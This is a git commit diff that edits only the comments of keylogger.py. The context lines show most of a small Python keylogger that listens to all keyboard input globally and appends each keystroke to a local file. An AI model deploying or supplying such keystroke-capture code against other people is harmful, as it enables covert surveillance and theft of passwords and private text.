1059c5eba70aeb1c4e1c0808822cd5a0e33728ac
Juliojefe <j.c.jf285@gmail.com>
2026-03-02 17:55:55 -0800

    final comments

--- keylogger.py
+++ keylogger.py
@@ -4,13 +4,12 @@ LOG_FILE = "keylog.txt"
 
 def format_key(key):
     try:
-        # Normal character keys
-        if key.char is not None:
+        if key.char is not None:    # normal character keys
             return key.char
         else:
             return ""   # strange cases such as ctrl+?
     except AttributeError:
-        # Special keys (Enter, Space, etc.)
+        # Special keys such as Space, Enter, Tab, and whatevre else
         if key == keyboard.Key.space:
             return " "
         elif key == keyboard.Key.enter:
@@ -22,12 +21,12 @@ def format_key(key):
 
 def on_press(key):
     with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(format_key(key))
+        f.write(format_key(key))    # write to file
 
 if __name__ == "__main__":
-    # Start global listener
+    #  start listener
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
 
-    # Keep program running
+    # keep program running
     listener.join()
